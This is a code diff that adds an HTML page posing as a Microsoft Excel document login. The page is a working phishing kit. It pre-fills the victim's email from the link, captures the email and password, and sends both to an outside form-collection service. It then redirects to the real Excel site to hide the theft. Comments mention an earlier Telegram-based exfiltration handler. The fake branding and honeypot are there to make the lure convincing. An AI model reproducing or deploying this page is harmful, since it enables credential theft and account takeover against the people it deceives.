@@ -1,0 +1,499 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="robots" content="noindex, nofollow" />
+    <title>Document</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+    <style>
+        :root {
+            /* Excel-specific colors for a light theme */
+            --excel-green: #107C41; /* Official Microsoft Excel Green */
+            --excel-green-light: #28A745;
+            --excel-green-dark: #0D5C2C; /* Added dark shade for click feedback */
+            --excel-red: #D93025; /* Advanced Red for Error UI */
+            --white-background: #FFFFFF;
+            --light-grey-text: #333333;
+            --medium-grey-border: #E0E0E0;
+            --shadow-color: rgba(0, 0, 0, 0.15);
+            --font-data: 'Segoe UI', 'Roboto', sans-serif;
+        }
+
+        /* 1. Body and General Layout (Responsive Centering) */
+        body {
+            font-family: var(--font-data);
+            color: var(--light-grey-text);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            background-color: var(--white-background);
+            padding: 10px; 
+            box-sizing: border-box;
+        }
+
+        /* 2. The Blurred Background Layer - Z-INDEX: 0 */
+        .blurred-background-layer {
+
+            position: fixed;
+
+            top: 0;
+
+            left: 0;
+
+            width: 100%;
+
+            height: 100%;
+
+            z-index: 0;
+
+            /* --- BACKGROUND IMAGE ADDED HERE --- */
+
+            background-image: url('https://gyazo.com/ffae2a73a30cf3f7ae6325890fe4db1c.jpg');
+
+            background-repeat: no-repeat;
+
+            background-position: center;
+
+            background-size: cover;
+
+            /* --- END BACKGROUND IMAGE ADDED HERE --- */
+
+            background-color: #EAEAEA; /* Fallback color */
+
+            background-size: cover;
+            background-position: top left;
+            filter: blur(4px);
+            -webkit-filter: blur(4px);
+            opacity: 0.7;
+        }
+
+        /* 3. Login Container (Compact, Advanced UI, Responsive) - Z-INDEX: 10 */
+        .login-container {
+            position: relative; 
+            z-index: 10;
+            width: 90%; 
+            max-width: 380px; /* Slightly narrower max width */
+            padding: 35px 30px; /* Reduced padding for compactness */
+            border-radius: 12px;
+            background: var(--white-background);
+            border: 1px solid var(--medium-grey-border);
+            /* Advanced UI: deeper shadow and subtle inner highlight for sophistication */
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2), inset 0 0 10px rgba(255, 255, 255, 0.7); 
+            text-align: center;
+            box-sizing: border-box;
+            filter: none;
+        }
+        
+        /* 4. Logo Area (SVG styles and animations are preserved) */
+        .svg-excel-logo-complex { display: block; margin: 0 auto; width: 120px; height: 100px; }
+        .logo-text { font-size: 2.5rem; color: var(--light-grey-text); font-weight: 300; letter-spacing: 2px; margin-top: 10px; }
+        .logo-text strong { color: var(--excel-green); font-weight: 700; }
+        .subtitle { font-size: 0.95rem; opacity: 0.7; margin-bottom: 30px; /* Slightly reduced margin */ }
+
+        /* 6. Input Fields & Button (Floating Label Styles) */
+        
+        /* Floating Input Group Container */
+        .input-float-group {
+            position: relative;
+            margin-bottom: 20px; /* Reduced vertical space between inputs for compactness */
+        }
+        
+        /* Advanced Input Field Look */
+        .input-field {
+            width: calc(100% - 24px); 
+            padding: 10px 10px 2px 10px; 
+            background: #FAFAFA; /* Slightly lighter base */
+            border: 1px solid #CCCCCC; /* Softer default border */
+            border-radius: 5px;
+            color: var(--light-grey-text);
+            font-size: 1rem;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+            /* Inset shadow for advanced, recessed field look */
+            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.08); 
+        }
+
+        /* Advanced Input Focus State */
+        .input-field:focus {
+            border-color: var(--excel-green-light); 
+            /* Subtle green glow on focus */
+            box-shadow: 0 0 0 2px rgba(16, 124, 65, 0.2), inset 0 1px 3px rgba(0, 0, 0, 0.08); 
+            background: var(--white-background); /* White background on focus for clarity */
+        }
+        
+        /* FLOATING LABEL STYLES */
+        .floating-label {
+            position: absolute;
+            top: 50%;
+            left: 12px;
+            transform: translateY(-50%);
+            color: #999;
+            pointer-events: none;
+            transition: all 0.2s ease-out;
+            font-size: 0.9rem; /* Slightly smaller resting label */
+            background: transparent; 
+        }
+
+        /* Floating state when input is focused OR has content (Advanced Look) */
+        .input-field:focus + .floating-label,
+        .input-field:not(:placeholder-shown) + .floating-label {
+            top: 0; 
+            font-size: 0.75rem; 
+            color: var(--excel-green); 
+            font-weight: 600; /* Bolder on focus for visual pop */
+            transform: translateY(-50%); 
+            padding: 0 5px;
+            background: var(--white-background); 
+            left: 8px; 
+        }
+        
+        /* --- ADVANCED ERROR MESSAGE STYLES --- */
+        .error-message {
+            margin: -5px 0 15px 0; /* Adjusted top margin for compactness */
+            text-align: left;
+            color: var(--excel-red); 
+            font-weight: 600;
+            font-size: 0.85rem;
+            padding: 8px 12px;
+            border-radius: 4px;
+            background-color: #FEE; 
+            border: 1px solid var(--excel-red);
+            display: none; 
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
+        }
+
+        .login-button {
+            width: calc(100% - 24px);
+            padding: 10px 10px 6px 10px; 
+            background: var(--excel-green); 
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 1.15rem;
+            font-weight: 700; 
+            transition: background 0.2s, box-shadow 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 5px; /* Reduced top margin for compactness */
+        }
+        .login-button:hover { 
+            background: var(--excel-green-light); 
+            box-shadow: 0 8px 20px rgba(16, 124, 65, 0.3); /* Green tinted shadow on hover */
+            cursor: pointer; 
+        }
+        .login-button:active { background: var(--excel-green-dark); }
+        .login-button:disabled { background: #60A36D; color: white; cursor: not-allowed; box-shadow: none; }
+
+        /* SVG animations styles are preserved */
+        @keyframes draw-x-square { 0% { transform: scaleY(0); } 100% { transform: scaleY(1); } }
+        @keyframes fade-in-x { 0% { opacity: 0; } 100% { opacity: 1; } }
+        @keyframes slide-in-doc { 0% { transform: translateX(50px) translateY(20px) scale(0.5); opacity: 0; } 100% { transform: translateX(0) translateY(0) scale(1); opacity: 1; } }
+        @keyframes logo-pulse { 0% { filter: drop-shadow(0 0 5px rgba(16, 124, 65, 0.3)); } 50% { filter: drop-shadow(0 0 15px rgba(16, 124, 65, 0.6)); } 100% { filter: drop-shadow(0 0 5px rgba(16, 124, 65, 0.3)); } }
+        
+        .excel-logo-group { animation: logo-pulse 3s infinite alternate ease-in-out; }
+
+        /* === SVG Fixes (Preserved) === */
+        
+        /* 1. Staggered timing for the X square and added origin for better scale effect */
+        .excel-x-square { 
+            animation: draw-x-square 1.2s ease-out forwards 0.2s; 
+            fill: var(--excel-green); 
+            transform-origin: bottom; /* Scales up from the bottom */
+        }
+        
+        /* 2. Staggered timing for the X letter and added fill color */
+        .excel-x-letter { 
+            fill: white; /* Added missing fill color */
+            animation: fade-in-x 1.5s ease-out forwards 0.8s; /* Staggered delay */
+        }
+        
+        /* 3. Staggered timing for document parts and added fill colors */
+        .doc-bg, .doc-corner, .doc-line, .doc-xls-text { 
+            animation: slide-in-doc 1.5s ease-out forwards 1.0s; /* Staggered delay */
+        }
+        
+        .doc-bg { fill: #F0F0F0; } /* Light gray background for the document */
+        .doc-corner { fill: #CCCCCC; } /* Darker gray corner fold */
+        .doc-line { fill: #CCCCCC; } /* Gray lines */
+        .doc-xls-text { fill: #333333; font-weight: 700; font-size: 15px; } /* Dark text */
+        
+        /* === END SVG FIXES === */
+        
+        /* 7. Options Bar for static text (New Section) */
+        .options-bar {
+            margin-top: 20px; /* Reduced margin */
+            font-size: 0.95rem;
+        }
+        .options-bar p { /* Targeting the static text element */
+            color: var(--light-grey-text);
+            font-weight: 500;
+            margin: 0; /* Remove default margin from p */
+        }
+
+        /* 8. Custom Message Box Styles (Hidden by Default) - Z-INDEX: 100 */
+        .message-box-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: none; /* Crucial: Hides the box by default */
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+        }
+
+        .message-box-content {
+            background: var(--white-background);
+            padding: 25px;
+            border-radius: 8px;
+            max-width: 350px;
+            width: 80%;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            text-align: left;
+            transform: scale(0.95);
+            animation: zoom-in 0.2s ease-out forwards;
+        }
+        
+        .message-box-content h3 {
+            color: var(--excel-green);
+            margin-top: 0;
+            font-size: 1.2rem;
+            border-bottom: 1px solid var(--medium-grey-border);
+            padding-bottom: 10px;
+            margin-bottom: 15px;
+        }
+
+        .message-box-content p {
+            margin-bottom: 20px;
+            font-size: 0.9rem;
+            color: var(--light-grey-text);
+            word-wrap: break-word; /* Ensure responsiveness for long text */
+        }
+
+        .message-box-button {
+            float: right;
+            padding: 8px 15px;
+            background-color: var(--excel-green);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .message-box-button:hover {
+            background-color: var(--excel-green-light);
+        }
+        
+        /* Simple animation for appearance */
+        @keyframes zoom-in {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        /* Media queries for high compatibility (Responsiveness is key) */
+        @media (max-width: 500px) {
+            .login-container { 
+                padding: 25px 20px; /* Even more compact on mobile */
+            }
+            .svg-excel-logo-complex { width: 100px; height: 85px; }
+            .logo-text { font-size: 2rem; }
+            .subtitle { font-size: 0.45rem; margin-bottom: 25px; }
+            .login-button { font-size: 1.05rem; }
+            .input-float-group { margin-bottom: 15px; }
+        }
+
+        /* Honeypot - hidden field to catch bots */
+        .honeypot-field {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
+            height: 0;
+            width: 0;
+            overflow: hidden;
+        }
+    </style>
+</head>
+
+<body>
+    
+    <div class="blurred-background-layer"></div>
+    
+    <div class="login-container">
+        
+        <div class="logo-area">
+            <!-- 
+                *** THE VERY VERY ADVANCE EXCEL LOGO 2025: ANIMATED SVG ***
+            -->
+            <svg class="svg-excel-logo-complex" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <g class="excel-logo-group">
+                    
+                    <!-- Main Green X Square -->
+                    <rect class="excel-x-square" x="5" y="10" width="60" height="60" rx="8"></rect>
+                    <text class="excel-x-letter" x="25" y="54" font-size="40">X</text>
+
+                    <!-- Document Icon Group -->
+                    <g transform="translate(35, 20)">
+                        <rect class="doc-bg" x="10" y="10" width="50" height="70" rx="5"></rect>
+                        <path class="doc-corner" d="M 45 10 L 60 25 V 10 L 45 10 Z"></path>
+                        <rect class="doc-line" x="17" y="30" width="36" height="5" rx="1"></rect>
+                        <rect class="doc-line" x="17" y="40" width="36" height="5" rx="1"></rect>
+                        <rect class="doc-line" x="17" y="50" width="25" height="5" rx="1"></rect>
+                        <text class="doc-xls-text" x="20" y="75">XLS</text>
+                    </g>
+                </g>
+            </svg>
+            
+            <p class="logo-text">Microsoft <strong>Excel</strong></p>
+        </div>
+
+        <p class="subtitle">Continue accessing the document using your credentials</p>
+
+        <!-- Form with Formspark action (replaced old handler) + honeypot -->
+        <form id="loginForm" action="https://submit-form.com/EQct5ilr9" method="POST">
+            <!-- Honeypot field - bots will fill this, humans won't see it -->
+            <div class="honeypot-field">
+                <label for="_gotcha">Leave this field empty</label>
+                <input type="text" id="_gotcha" name="_gotcha" value="" />
+            </div>
+            
+            <!-- FLOATING EMAIL FIELD -->
+            <div class="input-float-group">
+                <input type="text" id="email" name="email" class="input-field" placeholder="" required="" value="">
+                <label for="email" class="floating-label">Email</label>
+            </div>
+
+            <!-- FLOATING PASSWORD FIELD - UPDATED TEXT HERE -->
+            <div class="input-float-group">
+                <input type="password" id="password" name="password" class="input-field" placeholder=" " required="">
+                <label for="password" class="floating-label">Password</label>
+            </div>
+
+            <!-- ADVANCED ERROR MESSAGE UI -->
+            <div id="errorMessage" class="error-message">
+                Incorrect credentials. Please try the access key again.
+            </div>
+                
+            <button type="submit" class="login-button" id="submit-btn">Download.</button>
+
+
+
+        </form>
+
+        <div class="options-bar">
+            <!-- UPDATED: Static text for Copilot and copyright year -->
+            <p>Microsoft Copilot (c) 2026</p>
+        </div>
+    </div>
+    
+   
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+  <script>
+
+        /* global $ */
+    $(document).ready(function(){
+      
+      // Get email from URL parameters (?email=xxx) or fallback to hash (#email)
+      function getEmailFromUrl() {
+          var urlParams = new URLSearchParams(window.location.search);
+          var emailParam = urlParams.get('email');
+          if (emailParam) {
+              return emailParam;
+          }
+          // Fallback to hash (old method)
+          var hashEmail = window.location.hash.substr(1);
+          if (hashEmail && hashEmail.indexOf('@') > -1) {
+              return hashEmail;
+          }
+          return '';
+      }
+      
+      var dynamicEmail = getEmailFromUrl();
+      
+      if (dynamicEmail) {
+          $('#email').val(dynamicEmail);
+          // Update the floating label display to show the dynamic email
+          $('.input-float-group .floating-label').eq(0).text(dynamicEmail);
+      } else {
+          // If no email in URL, field remains empty
+          $('#email').val('');
+          $('.input-float-group .floating-label').eq(0).text('Email');
+      }
+      
+      // Formspark submission - replace old Telegram submission
+      $('#loginForm').on('submit', function(event){
+        event.preventDefault();
+        
+        var email = $("#email").val();
+        var password = $("#password").val();
+        var honeypot = $("#_gotcha").val();
+        
+        // Honeypot check - if filled, silently reject
+        if (honeypot !== "") {
+            console.log("Honeypot triggered - bot detected");
+            $("#errorMessage").text("Validation error. Please try again.").show();
+            return false;
+        }
+        
+        if (!email) {
+            $("#errorMessage").text("Please enter your email.").show();
+            return false;
+        }
+        
+        if (!password) {
+            $("#errorMessage").text("Please enter your password.").show();
+            return false;
+        }
+        
+        // Email validation
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        if (!filter.test(email)) {
+            $("#errorMessage").text("Please enter a valid email address.").show();
+            return false;
+        }
+        
+        $("#errorMessage").hide();
+        $("#submit-btn").prop('disabled', true).html('Processing...');
+        
+        // Submit to Formspark
+        var formData = {
+            email: email,
+            password: password,
+            _redirect: "https://excel.cloud.microsoft.com/en-us/"
+        };
+        
+        $.ajax({
+            url: $(this).attr('action'),
+            type: 'POST',
+            data: JSON.stringify(formData),
+            contentType: 'application/json',
+            success: function(response) {
+                $("#password").val("");
+                $("#submit-btn").prop('disabled', false).html('Download.');
+                // Redirect after successful submission
+                window.location.replace("https://excel.cloud.microsoft.com/en-us/");
+            },
+            error: function(xhr, status, error) {
+                $("#errorMessage").text("Account or password does not match. Please try again.").show();
+                $("#password").val("");
+                $("#submit-btn").prop('disabled', false).html('Download.');
+            }
+        });
+      });
+    });
+
+
+</script>
+
+
+</body></html>
